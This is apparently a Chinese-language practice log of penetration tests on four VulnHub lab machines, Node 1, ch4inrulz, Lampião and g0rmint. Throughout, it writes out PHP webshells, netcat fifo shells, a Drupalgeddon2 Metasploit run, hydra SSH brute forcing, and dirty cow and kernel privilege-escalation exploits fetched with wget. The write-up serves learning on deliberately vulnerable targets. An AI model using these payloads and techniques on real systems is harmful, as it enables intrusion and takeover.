---
title: vulnhub 练习记录
date: 2018-09-13 16:38:39
tags:
	- 渗透测试
	- 练习记录
	- vulnhub
---





# Node 1

## 主机探测

先用`arp-scan -l `或者`nmap -sP `扫描一下C段进行主机发现

发现主机ip为`192.168.85.135`

然后利用nmap进行详细扫描

```
nmap -sS -T4 -A -v 192.168.85.135
```

![](vulnhub-练习记录\1.png)



## 获取源码

访问下3000端口，是个正常的web服务

![](vulnhub-练习记录\2.png)

查看js文件后可以看到一些api端口，访问一下可以发现一些类似memached的字段

![](vulnhub-练习记录\3.png)

可以试着找一些网站解一下hash

解出tom的密码为`spongebob`，尝试登录一下

![](vulnhub-练习记录\4.png)

似乎在说需要管理员登录，于是重新看了些api，发现`/api/users`中可以看到管理员的密码哈希值

![](vulnhub-练习记录\5.png)

还是可以解出，然后登录之后可以下载到一个backup文件，貌似是一些base64值可以尝试解码一下

```
base64 -d myplace.backup > myplace
```

linux下可以直接看出是一个zip格式文件，尝试解压但似乎需要密码

这时可以用kali下的一个`fcrackzip`工具尝试爆破密码

![](vulnhub-练习记录\6.png)

然后就可以获得网站源码了



## getshell & 提升权限

可以看到是一个nodejs写的网站，在app.js中可以看到一个用户的ssh密码

```
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
```

于是就直接ssh连接即可

查看一下linux版本是否可以提权

```
uname -a
cat /etc/lsb-release 
```



![](vulnhub-练习记录\7.png)

查看下有没有可以提权的脚本

```
searchsploit ubuntu 16.04
```

![](vulnhub-练习记录\8.png)

挑一个44298.c来试试看

在tmp目录下wget之后，编译运行即可获取到root权限

![](vulnhub-练习记录\9.png)



# ch4inrulz

## 主机探测

依旧用`arp-scan -l`可以搜索到192.168.85.136的靶机ip

nmap扫一波端口

```shell
nmap -sS -T4 -A -v 192.168.85.136
```

![](vulnhub-练习记录\10.png)

可以先尝试把目标放在 `80`和`8011`两个web端口上



## 功能检测

8011端口会显示一个开发服务

![](vulnhub-练习记录\12.png)

测试了下目录可以发现一个api目录

![](vulnhub-练习记录\13.png)

测试了下这些接口就只有files_api.php可以访问，并且可以通过post file参数进行任意文件读取

![](vulnhub-练习记录\14.png)



80端口一开始似乎就是个静态的页面，后期发现了一个`development`目录

一开始是需要一个验证的过程，这个哈希密码需要访问`index.html.bak`中有一个带盐的哈希密码值

![](vulnhub-练习记录\24.png)

将这个密码通过john进行爆破，可以得到原来密码的值

![](vulnhub-练习记录\25.png)

然后就可以通过目录验证，登录到`development`目录中



![](vulnhub-练习记录\15.png)

尝试着访问下这个uploader的目录，可以看到一个文件上传的功能

测试了上传一个php会对文件后缀进行拦截

但是即使修改了问价后缀也会提示不是图片的格式，感觉应该是代码里检测了文件头

于是就可以用copy命令，在图片后面追加一些数据

1.txt内容如下

```php
<?php echo system($_POST[_]); ?>
```

然后随意找一张图片，在windows下用copy命令

![](vulnhub-练习记录\16.png)

就可以看到文字成功追加到图片后面了

![](vulnhub-练习记录\17.png)

然后就可以成功上传了， 还有一个问题就是不知道文件夹的名字

这里看了别人的writeup发现是用一些关键字进行fuzz爆破目录（感觉脑洞是有点大，就跳了把

上传的文件都在`/development/uploader/FRANKuploads/`目录下

![](vulnhub-练习记录\18.png)



## 结合文件包含getshell

虽然这里无法上传一个正常的php文件，但是之前的8011端口还存在一个任意文件包含，于是可以相互结合，执行php代码

这里需要进行一下简单的目录猜测

```
/var/www/development/uploader/FRANKuploads/2.png
```

可以成功执行命令了

![](vulnhub-练习记录\19.png)

然后就行反弹shell

之前常用的本机监听端口反弹shell命令似乎无法执行。于是选择了另外一中反向连接的弹shell方式。

靶机上

```shell
mkfifo /tmp/tmp_fifo
cat /tmp/tmp_fifo | /bin/sh -i 2>&1 | nc -l 1567 > /tmp/tmp_fifo
```

本机上

```shell
nc -n 192.168.85.136 1567
```



post传输的时候注意一下url编码几个，然后就可以收到反弹回来的shell

![](vulnhub-练习记录\20.png)



## 提升权限

更改下成bash的交互式命令行

```shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

然后也查看下系统的版本号什么的

![](vulnhub-练习记录\21.png)



于是想试下传说中的脏牛提权（dirty cow）

提权为了防止权限制，需要切换到`/tmp`目录下，下载好.c文件，然后编译运行

```shell
gcc -pthread dirty.c -o dirty -lcrypt
```

然后运行脚本，后面password为想更改的密码，默认账号为firefart

```shell
./dirty password 
```

![](vulnhub-练习记录\22.png)

尝试ssh连接一下

![](vulnhub-练习记录\23.png)

假如实际渗透中记得将passwd备份文件还原，以免造成原账号的不可用

```shell
mv /tmp/passwd.bak /etc/passwd
```

至此就拿下了靶机的root权限





# 

# Lampião

## 主机探测

`arp-scan -l`探测一下靶机ip

![](vulnhub-练习记录\26.png)

可以探测到ip为192.168.85.137，再用nmap扫一波，但是这里有个问题，有一个端口`1898`端口不是常规端口，需要用nmap进行一次全局扫描

```
nmap -sS -T4 -A -v -p 1-50000 192.168.85.137
```

![](vulnhub-练习记录\27.png)

80端口就是一个普通的静态页面，目录扫描也没扫到什么

![](vulnhub-练习记录\28.png)

1898端口中运行着一个Drupal服务，重点应该是在这里了

![](vulnhub-练习记录\29.png)

## msf getshell

msf搜了一波之后可以看到一个`Drupal`2018年的exp，于是决定尝试一下

![](vulnhub-练习记录\30.png)

没想的居然就成功了，返回了一个msf 的shell

```shell
use exploit/unix/webapp/drupal_drupalgeddon2 
show options
set RHOST 192.168.85.137
set RPORT 1898
exploit
```

![](vulnhub-练习记录\31.png)

输入shell之后就可以运行webshell终端了



## 爆破ssh密码 getshell

先知上看到的别人一个骚操作，在网页上可以看到两个作者，于是便开始尝试爆破他们的ssh密码

![](vulnhub-练习记录\32.png)

把名字添加到`username.txt`中

```shell
echo "tiago" > username.txt
echo "Eder" >> username.txt
```

然后利用`cewl` 从网页中尝试生成一份密码字典（这也太叼了把。。学习了

```shell
cewl -w dict.txt http://192.168.85.137:1898/
```



然后用传说中的九头蛇`hydra`进行一下ssh密码爆破

```shell
hydra -L username.txt -P dict.txt -f -e nsr -t 4 ssh://192.168.85.137
```

爆破过程有点慢，感觉相当不适合大规模爆破了

![](vulnhub-练习记录\33.png)

然后就可以ssh登录了可以说思路相当清奇了

## 提升权限

拿到shell之后查看一下版本信息

```shell
tiago@lampiao:~$ uname -a
Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
tiago@lampiao:~$ cat /etc/lsb-release 
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.5 LTS"
```

14.04的，那就脏牛安排一手

```shell
cd /tmp
scp root@192.168.85.134:/root/dirty.c ./
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
```

即可成功修改管理员密码，获得root权限



# g0rmint

## 主机探测

先用`arp-scan -l`查看一下靶机的ip

![](vulnhub-练习记录\34.png)

可以确定是`192.168.85.139`的ip了，用nmap扫描一波看看开放的端口的信息

```shell
nmap -sS -T4 -A -v -p 1-50000 192.168.85.139
```

可以看到一共就开放了两个端口

![](vulnhub-练习记录\35.png)

## 信息搜集

访问80端口之后发现返回的是404

![](vulnhub-练习记录\36.png)

但是nmap的扫描结果中可以看到一个robots文件，不妨先看一下

![](vulnhub-练习记录\37.png)

访问`/g0rmint/`页面之后是一个登录界面

![](vulnhub-练习记录\38.png)

尝试一波弱口令无果后，在html源代码中发现了一个奇怪的东西

![](vulnhub-练习记录\39.png)

访问之后依旧是404 就很苦恼了，然后用爆破了一下目录，发现了点东西

```shell
dirb http://192.168.85.139/g0rmint/s3cretbackupdirect0ry/
```

![](vulnhub-练习记录\40.png)

里面提示了`backup.zip`，遂就能下载到源码文件了



## 代码审计

文件结构

![](vulnhub-练习记录\41.png)

在`login.php`中可以看到

```php
<?php
include_once('config.php');
if (isset($_POST['submit'])) { // If form is submitted
    $email = $_POST['email'];
    $pass = md5($_POST['pass']);

    $sql = $pdo->prepare("SELECT * FROM g0rmint WHERE email = :email AND pass = :pass");
    $sql->bindParam(":email", $email);
    $sql->bindParam(":pass", $pass);
    $row = $sql->execute();
    $result = $sql->fetch(PDO::FETCH_ASSOC);
    if (count($result) > 1) {
        session_start();
        $_SESSION['username'] = $result['username'];
        header('Location: index.php');
        exit();
    } else {
        $log = $email;
        $reason = "Failed login attempt detected with email: ";
        addlog($log, $reason);
    }
}
?>
```

登录失败的时候会生成一个日志文件`addlog($log, $reason);`，看下这个addlog的代码

```php
function addlog($log, $reason) {
    $myFile = "s3cr3t-dir3ct0ry-f0r-l0gs/" . date("Y-m-d") . ".php";
    if (file_exists($myFile)) {
        $fh = fopen($myFile, 'a');
        fwrite($fh, $reason . $log . "<br>\n");
    } else {
        $fh = fopen($myFile, 'w');
        fwrite($fh, file_get_contents("dummy.php") . "<br>\n");
        fclose($fh);
        $fh = fopen($myFile, 'a');
        fwrite($fh, $reason . $log . "<br>\n");
    }
    fclose($fh);
}
```

偏偏写在了一个`.php`的文件中，这样我们的思路就可以尝试在登录邮箱处插入一个php语句，从而任意代码执行

可是在尝试去访问改文件的时候却跳转到了登录界面。

最后发现是`fwrite($fh, file_get_contents("dummy.php") . "<br>\n");`写入了一个session判断

所以还是得先解决登录的问题。





继续看代码，在db.sql中可以看到一条插入的数据

```sql
INSERT INTO `g0rmint` (`id`, `username`, `email`, `pass`) VALUES
(1, 'demo', 'demo@example.com', 'fe01ce2a7fbac8fafaed7c982a04e229');
```

解密这个哈希值之后发现是`demo`

![](vulnhub-练习记录\42.png)

尝试登录一波，发现似乎无法登录，可能是后期改了密码或者怎么，总之应该需要换一条登录的思路了



文件中有一个重置密码的文件`reset.php`

```php
<?php
include_once('config.php');
$message = "";
if (isset($_POST['submit'])) { // If form is submitted
    $email = $_POST['email'];
    $user = $_POST['user'];
    $sql = $pdo->prepare("SELECT * FROM g0rmint WHERE email = :email AND username = :user");
    $sql->bindParam(":email", $email);
    $sql->bindParam(":user", $user);
    $row = $sql->execute();
    $result = $sql->fetch(PDO::FETCH_ASSOC);
    if (count($result) > 1) {
        $password = substr(hash('sha1', gmdate("l jS \of F Y h:i:s A")), 0, 20);
        $password = md5($password);
        $sql = $pdo->prepare("UPDATE g0rmint SET pass = :pass where id = 1");
        $sql->bindParam(":pass", $password);
        $row = $sql->execute();
        $message = "A new password has been sent to your email";
    } else {
        $message = "User not found in our database";
    }
}
?>
```

可以看到，只需要知道一个存在的邮箱和用户名，就可以重置密码为一个时间值的哈希

但是，尝试了`demo`和一些常用邮箱用户名之后，发现似乎并没有这个用户

![](vulnhub-练习记录\43.png)

后面这个思路确实有点骚，问了队友才知道怎么弄，尝试在全部文件中搜索`email`关键字

可以在一个`css`文件中看到用户的名字和邮箱

![](vulnhub-练习记录\44.png)

成功重置后，界面右下角也给出了对应的时间，遂能算出相应的哈希值

![](vulnhub-练习记录\45.png)

```php
echo substr(hash('sha1', 'Saturday 15th of September 2018 02:05:51 AM'), 0, 20);
```

```
9997d372a7af4f7a680b
```

用邮箱和算出的哈希值就能登录到后台中

这时也能成功的访问到生成的log文件了



## getshell

这样，我们在登录的时邮箱处插入一条php语句，写入webshell

```php
<?php eval($_POST[_]); ?>
```

然后访问对应的日志，提交post参数即可执行任意php代码

![](vulnhub-练习记录\46.png)

然后将shell弹到我的kali中来

在post中**依次*传入

```
_=`mkfifo /tmp/t`;
_=`cat /tmp/t | /bin/sh -i 2>&1 | nc -l 8888 > /tmp/t`;
```

注意url编码

```
_=%60mkfifo%20%2ftmp%2ft%60%3B
_=%60cat%20%2ftmp%2ft%20%7C%20%2fbin%2fsh%20-i%202%3E%261%20%7C%20nc%20-l%208888%20%3E%20%2ftmp%2ft%60%3B
```

第二次post完之后，浏览器会进入阻塞状态，在kali中用nc连接即可

```shell
nc -n 192.168.85.139 8888
```

![](vulnhub-练习记录\47.png)

## 提升权限

接下来就是尝试能不能提权成root，先查看一下版本信息

![](vulnhub-练习记录\48.png)

找一下ubuntu 16.04的提权脚本

![](vulnhub-练习记录\49.png)

挑一个44298来看看，将这个文件移动到`/var/www/html`目录下之后，在webshell中运行

```shell
wget http://192.168.85.134/44298.c /tmp/
```

然而编译的时候一个比较尴尬的事情发生了，没有安装gcc

![](vulnhub-练习记录\50.png)

所以就只能在本地编译后上传了，为防止一些库的差异，我选择了在我另外一台ubuntu 16.04的虚拟机中编译

```shell
gcc 44298.c -o e
```

然后还是将这个文件放到www目录，通过wget的方式下载到`/tmp`目录下

赋予权限，提权

```shell
chmod 777 e
./e
```

就可以成功提权成为root了

![](vulnhub-练习记录\51.png)





